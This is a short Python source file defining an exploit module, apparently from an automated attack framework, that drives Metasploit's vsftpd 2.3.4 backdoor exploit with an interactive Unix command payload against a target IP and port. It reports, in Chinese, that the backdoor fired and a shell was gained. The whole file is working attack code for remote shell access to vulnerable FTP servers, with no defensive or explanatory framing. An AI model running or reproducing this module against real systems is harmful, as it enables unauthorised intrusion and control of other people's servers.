class Module:
    def __init__(self):
        self.name = "vsftpd 2.3.4 Backdoor (via MSF)"
        self.port = 21
        self.protocol = "tcp"
        self.platform = "unix"
        self.use_msf = True
        self.msf_client = None

    def exploit(self, target_ip=None, target_port=21, lhost=None):
        try:
            exploit = self.msf_client.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
            exploit["RHOSTS"] = target_ip
            exploit["RPORT"] = target_port
            payload = self.msf_client.modules.use("payload", "cmd/unix/interact")
            result = exploit.execute(payload=payload)
            if result.get("job_id"):
                return True, "vsftpd 后门触发成功，已获得 shell"
            return False, str(result)
        except Exception as e:
            return False, str(e)
